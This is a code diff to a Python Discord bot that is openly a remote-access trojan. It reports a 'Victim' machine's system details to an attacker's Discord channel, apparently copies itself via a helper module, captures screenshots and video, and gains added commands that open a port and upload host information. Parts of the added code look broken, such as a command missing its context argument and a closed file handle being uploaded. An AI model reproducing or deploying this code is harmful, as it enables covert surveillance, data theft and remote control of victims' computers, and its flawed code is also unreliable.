@@ -4,14 +4,15 @@ from discord.ext import commands
 import os
 import sys
 import platform
+import shutil
 import time
 import webbrowser
+import file_coper as cp
 import subprocess
 import shutil
 intents = discord.Intents.all()
-client = commands.Bot(command_prefix='.', intents=intents)
-id = #Channel ID
-# Nothing personal. It's just my job
+client = commands.Bot(command_prefix='>', intents=intents)
+id = ID
 @client.event
 async def on_ready():
     channel = client.get_channel(id)
@@ -25,6 +26,7 @@ async def on_ready():
         embed = discord.Embed(title='Victim', description=f'OS: {platform.system()} \n Version: {platform.release()} \n Type: {platform.machine()} \n Architecture: {platform.architecture()}', color=0x00ff6a)
         embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/MacOS_wordmark_%282017%29.svg/1920px-MacOS_wordmark_%282017%29.svg.png")
     await channel.send(embed=embed)
+    cp.main('main.py')
 
 @client.command(help='Screenshot of the screen')
 async def screenshot(ctx):
@@ -134,8 +136,31 @@ async def video(ctx, count):
             await channel.send(file=file)
     os.remove('screenshot.png')
 
+@client.command(help='Open port')
+async def port(port2):
+    cp.port(port=port2)
 
+
+@client.command(help="PC info in .data file")
+async def data(ctx):
+    channel = client.get_channel(id)
+    data = []
+    operating_system = platform.system()
+    release = platform.release()
+    processor = platform.processor() 
+    machine = platform.machine()
+    node = platform.node()
+    data.append(f'Operating System: {operating_system} {release}')
+    data.append(f'Processor: {processor}')
+    data.append(f'Architecture: {machine}')
+    data.append(f'Node Name: {node}')
+    with open('info.txt', 'w') as f:
+        for line in data:
+            f.write(line + '\n')
+    file = discord.File(f, filename='info.txt')
+    await channel.send(file=file)
+    os.remove('info.txt')
 #U29ycnkgSSdtIGp1c3QgZG9pbmcgbXkgam9i
 
 
-client.run('')
+client.run('Token Here!')
